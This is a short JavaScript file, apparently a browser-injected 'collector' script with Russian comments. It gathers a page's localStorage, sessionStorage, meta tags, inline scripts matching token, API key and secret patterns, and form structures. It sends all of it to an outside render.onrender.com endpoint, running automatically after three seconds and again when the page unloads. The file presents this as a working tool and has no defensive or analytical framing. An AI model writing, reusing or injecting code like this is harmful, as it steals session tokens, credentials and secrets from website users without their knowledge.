
// KIWI COLLECTOR v1.0
const BRIDGE = "https://claude-bridge-render.onrender.com";
const KEY = "claude2025";

async function collect() {
  const data = {
    type: "page_data",
    url: location.href,
    host: location.host,
    title: document.title,
    time: new Date().toISOString(),

    // P1: localStorage
    localStorage: getStorage(localStorage),

    // P1: sessionStorage
    sessionStorage: getStorage(sessionStorage),

    // P2: Meta токены
    meta: getMeta(),

    // P2: Inline данные (токены в скриптах)
    inline: getInlineData(),

    // P3: Формы
    forms: getForms()
  };

  await send(data);
  console.log("[KC] Data collected");
}

function getStorage(storage) {
  const data = {};
  for (let i = 0; i < storage.length; i++) {
    const key = storage.key(i);
    data[key] = storage.getItem(key);
  }
  return data;
}

function getMeta() {
  const meta = {};
  document.querySelectorAll("meta").forEach(m => {
    const name = m.name || m.getAttribute("property");
    if (name && m.content) meta[name] = m.content;
  });
  return meta;
}

function getInlineData() {
  const found = {};
  document.querySelectorAll("script").forEach(s => {
    const t = s.textContent || "";

    // Next.js __NEXT_DATA__
    if (t.includes("__NEXT_DATA__")) {
      const m = t.match(/<script id="__NEXT_DATA__"[^>]*>([\s\S]*?)<\/script>/);
      if (m) found.nextData = m[1].slice(0, 2000);
    }

    // window.config, window.TOKEN etc
    const patterns = ["config", "CONFIG", "token", "TOKEN", "apiKey", "API_KEY", "secret"];
    patterns.forEach(p => {
      if (t.includes("window." + p) || t.includes("window.__" + p)) {
        const idx = t.indexOf(p);
        found[p] = t.slice(Math.max(0, idx - 20), idx + 200);
      }
    });
  });
  return found;
}

function getForms() {
  return Array.from(document.forms).slice(0, 5).map(f => ({
    action: f.action,
    method: f.method,
    fields: Array.from(f.elements).filter(e => e.name).map(e => e.name)
  }));
}

async function send(data) {
  try {
    await fetch(BRIDGE + "/collect", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({key: KEY, data: data})
    });
  } catch(e) {
    console.log("[KC] Send error:", e.message);
  }
}

// Запуск через 3 сек
setTimeout(collect, 3000);

// Также при уходе со страницы
window.addEventListener("beforeunload", collect);
